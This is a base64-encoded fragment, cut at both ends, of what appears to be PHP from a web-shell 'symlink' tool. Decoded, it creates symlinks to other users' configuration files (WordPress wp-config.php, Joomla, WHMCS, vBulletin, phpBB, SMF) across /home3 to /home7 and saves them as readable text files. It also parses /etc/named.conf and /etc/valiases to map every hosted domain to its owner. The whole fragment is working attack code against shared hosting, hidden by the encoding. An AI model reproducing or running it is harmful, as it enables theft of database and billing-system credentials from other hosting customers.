LiR1c2Vybi4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG04LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG05LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkcGRvbWFpbi4nfn41LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fjQudHh0Jyk7CgkJc3ltbGluaygnL2hvbWUzLycuJHVzZXJuLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkcGRvbWFpbi4nfn5pbnZpc2lvLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywkcGRvbWFpbi4nfn43LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywkcGRvbWFpbi4nfn44LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn5tay1wb3J0YWxlMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTMvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fjEyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJHBkb21haW4uJ35+U21mLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lMy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRwZG9tYWluLid+fnBocGJiMy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTMvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJHBkb21haW4uJ35+aW5maW5pdHkudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn52QnVsbGV0aW4yLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fnZCdWxsZXRpbjMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluNC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkcGRvbWFpbi4nfn5QaHBiYjEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+UGhwYmIyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRwZG9tYWluLid+fldvcmRwcmVzczEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkcGRvbWFpbi4nfn5Xb3JkcHJlc3MyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5Kb29tbGExLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fkpvb21sYTIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5Kb29tbGEzLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG0yLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG00LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG01LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTYudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htNy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htOC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htOS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJHBkb21haW4uJ35+NS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkcGRvbWFpbi4nfn40LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNC8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJHBkb21haW4uJ35+aW52aXNpby50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJHBkb21haW4uJ35+Ny50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJHBkb21haW4uJ35+OC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+bWstcG9ydGFsZTEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZS9jb25maWcucGhwJywkcGRvbWFpbi4nfn4xMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9zZXR0aW5ncy5waHAnLCRwZG9tYWluLid+flNtZi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTQvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkcGRvbWFpbi4nfn5waHBiYjMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU0LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRwZG9tYWluLid+fmluZmluaXR5LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fnZCdWxsZXRpbjEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn52QnVsbGV0aW4zLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fnZCdWxsZXRpbjQudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJHBkb21haW4uJ35+UGhwYmIxLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+flBocGJiMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkcGRvbWFpbi4nfn5Xb3JkcHJlc3MxLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJHBkb21haW4uJ35+V29yZHByZXNzMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+Sm9vbWxhMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5Kb29tbGEyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+Sm9vbWxhMy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG0zLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htNC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htNS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG02LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTcudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTgudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTkudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRwZG9tYWluLid+fjUudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJHBkb21haW4uJ35+NC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTUvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRwZG9tYWluLid+fmludmlzaW8udHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRwZG9tYWluLid+fjcudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRwZG9tYWluLid+fjgudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fm1rLXBvcnRhbGUxLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJHBkb21haW4uJ35+MTIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvc2V0dGluZ3MucGhwJywkcGRvbWFpbi4nfn5TbWYudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU1LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJHBkb21haW4uJ35+cGhwYmIzLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNS8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywkcGRvbWFpbi4nfn5pbmZpbml0eS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn52QnVsbGV0aW4xLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fnZCdWxsZXRpbjIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluMy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn52QnVsbGV0aW40LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRwZG9tYWluLid+flBocGJiMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn5QaHBiYjIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJHBkb21haW4uJ35+V29yZHByZXNzMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRwZG9tYWluLid+fldvcmRwcmVzczIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fkpvb21sYTEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+Sm9vbWxhMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fkpvb21sYTMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG0xLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htMy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTQudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTUudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htNi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG03LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG04LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG05LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkcGRvbWFpbi4nfn41LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fjQudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU2LycuJHVzZXJuLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkcGRvbWFpbi4nfn5pbnZpc2lvLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywkcGRvbWFpbi4nfn43LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywkcGRvbWFpbi4nfn44LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn5tay1wb3J0YWxlMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fjEyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJHBkb21haW4uJ35+U21mLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNi8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRwZG9tYWluLid+fnBocGJiMy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTYvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJHBkb21haW4uJ35+aW5maW5pdHkudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywkcGRvbWFpbi4nfn52QnVsbGV0aW4yLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRwZG9tYWluLid+fnZCdWxsZXRpbjMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+dkJ1bGxldGluNC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkcGRvbWFpbi4nfn5QaHBiYjEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHBkb21haW4uJ35+UGhwYmIyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRwZG9tYWluLid+fldvcmRwcmVzczEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkcGRvbWFpbi4nfn5Xb3JkcHJlc3MyLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5Kb29tbGExLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fkpvb21sYTIudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5Kb29tbGEzLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htMS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG0yLnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG00LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkcGRvbWFpbi4nfn5XaG01LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRwZG9tYWluLid+fldobTYudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htNy50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htOC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJHBkb21haW4uJ35+V2htOS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJHBkb21haW4uJ35+NS50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkcGRvbWFpbi4nfn40LnR4dCcpOwoJCXN5bWxpbmsoJy9ob21lNy8nLiR1c2Vybi4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJHBkb21haW4uJ35+aW52aXNpby50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJHBkb21haW4uJ35+Ny50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJHBkb21haW4uJ35+OC50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+bWstcG9ydGFsZTEudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZS9jb25maWcucGhwJywkcGRvbWFpbi4nfn4xMi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9zZXR0aW5ncy5waHAnLCRwZG9tYWluLid+flNtZi50eHQnKTsKCQlzeW1saW5rKCcvaG9tZTcvJy4kdXNlcm4uJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkcGRvbWFpbi4nfn5waHBiYjMudHh0Jyk7CgkJc3ltbGluaygnL2hvbWU3LycuJHVzZXJuLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRwZG9tYWluLid+fmluZmluaXR5LnR4dCcpOwoJfQoKCQkJCSRkMG1haW5zID0gQGZpbGUoIi9ldGMvbmFtZWQuY29uZiIpOwoJCQoJCQkJaWYoJGQwbWFpbnMpCgkJCQl7CgkJCQkJbWtkaXIoJGZuKTsKCQkJCQljaGRpcigkZm4pOwoJCQkJCQkJCQkJCgkJCQkJZm9yZWFjaCgkZDBtYWlucyBhcyAkZDBtYWluKQoJCQkJCXsKCQkJCQkJaWYoZXJlZ2koInpvbmUiLCRkMG1haW4pKQoJCQkJCQl7CgkJCQkJCQlwcmVnX21hdGNoX2FsbCgnI3pvbmUgIiguKikiIycsICRkMG1haW4sICRkb21haW5zKTsKCQkJCQkJCWZsdXNoKCk7CgkJCQkJCQkJCgkJCQkJCQlpZihzdHJsZW4odHJpbSgkZG9tYWluc1sxXVswXSkpID4gMikKCQkJCQkJCXsgCgkJCQkJCQkJJHVzZXIgPSBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCIvZXRjL3ZhbGlhc2VzLyIuJGRvbWFpbnNbMV1bMF0pKTsKCQkJCQkJCQkKCQkJCQkJCQlzeW1sKCR1c2VyWyduYW1lJ10sJGRvbWFpbnNbMV1bMF0pOwkJCQkJCgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQkJZWNobyAiPGNlbnRlcj48Zm9udCBjb2xvcj1sa